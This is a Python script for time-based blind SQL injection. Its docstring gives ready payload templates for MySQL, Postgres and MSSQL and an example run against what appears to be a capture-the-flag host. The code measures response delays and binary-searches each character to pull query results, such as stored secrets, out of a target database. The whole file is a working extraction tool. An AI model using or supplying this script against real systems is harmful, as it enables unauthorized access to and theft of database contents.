#!/usr/bin/env python3
"""Generic time-based blind SQLi extractor.

--template contains {cond}; it must make the DB sleep when {cond} is TRUE, e.g.
  MySQL INSERT : "x', (SELECT IF(({cond}),SLEEP(0.6),0)) ) -- "
  MySQL WHERE  : "x' AND IF(({cond}),SLEEP(0.6),0)-- -"
  Postgres     : "x' AND (SELECT CASE WHEN ({cond}) THEN pg_sleep(0.6) ELSE pg_sleep(0) END) IS NOT NULL--"
  MSSQL        : "x'; IF ({cond}) WAITFOR DELAY '0:0:1'--"

    python blind_time.py http://sqli6.chal.deti:8035/ --post "name={}&message=hi" \
        --template "x', (SELECT IF(({cond}),SLEEP(0.6),0)) ) -- " \
        --query "SELECT secret FROM vault LIMIT 1" --dbms mysql --delay 0.6
"""
import argparse
import statistics
import sys
import time
from urllib.parse import quote

import requests

FN = {
    "mysql": ("ASCII(SUBSTRING(({q}),{p},1))", "CHAR_LENGTH(({q}))"),
    "postgres": ("ASCII(SUBSTRING(({q}),{p},1))", "LENGTH(({q}))"),
    "mssql": ("ASCII(SUBSTRING(({q}),{p},1))", "LEN(({q}))"),
    "sqlite": ("unicode(substr(({q}),{p},1))", "length(({q}))"),
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--post")
    ap.add_argument("--template", required=True)
    ap.add_argument("--query", required=True)
    ap.add_argument("--dbms", default="mysql", choices=list(FN))
    ap.add_argument("--delay", type=float, default=0.6, help="sleep used in the template (seconds)")
    ap.add_argument("--max", type=int, default=200)
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    s = requests.Session()
    if a.cookie:
        s.headers["Cookie"] = a.cookie

    def elapsed(cond):
        inj = quote(a.template.replace("{cond}", cond), safe="")
        t0 = time.perf_counter()
        if a.post:
            s.post(a.url, data=a.post.replace("{}", inj), timeout=60,
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            s.get(a.url.replace("{}", inj), timeout=60)
        return time.perf_counter() - t0

    # Baseline from the MINIMUM of several no-sleep requests: network/CPU jitter
    # only ever ADDS latency, so the minimum recovers the true "fast" time.
    fast = min(elapsed("1=2") for _ in range(4))
    slow = min(elapsed("1=1") for _ in range(2))
    thr = fast + a.delay * 0.5
    print(f"[i] false~{fast:.3f}s true~{slow:.3f}s threshold={thr:.3f}s (min-sampling)")
    if slow - fast < a.delay * 0.5:
        sys.exit("[!] no timing difference — fix the template / raise --delay")

    def oracle(cond):
        # min of N: a FALSE cond never sleeps, so its min ~ fast even under load;
        # a TRUE cond always sleeps, so its min >= fast+delay. Escalate samples
        # only when the fastest reading lands in the ambiguous band.
        t = elapsed(cond)
        if t <= thr:            # looks false, but could be a fast true — confirm
            return False
        for _ in range(2):      # looks true: make sure it is not a one-off spike
            t = min(t, elapsed(cond))
            if t <= thr:
                return False
        return True

    ch, ln = FN[a.dbms]
    q = a.query
    out = ""
    for p in range(1, a.max + 1):
        if not oracle(f"{ch.format(q=q, p=p)}>0"):
            break
        lo, hi = 0, 255
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if oracle(f"{ch.format(q=q, p=p)}>{mid}"):
                lo = mid
            else:
                hi = mid
        out += chr(hi)
        print(out, flush=True)
    print(out)


if __name__ == "__main__":
    main()
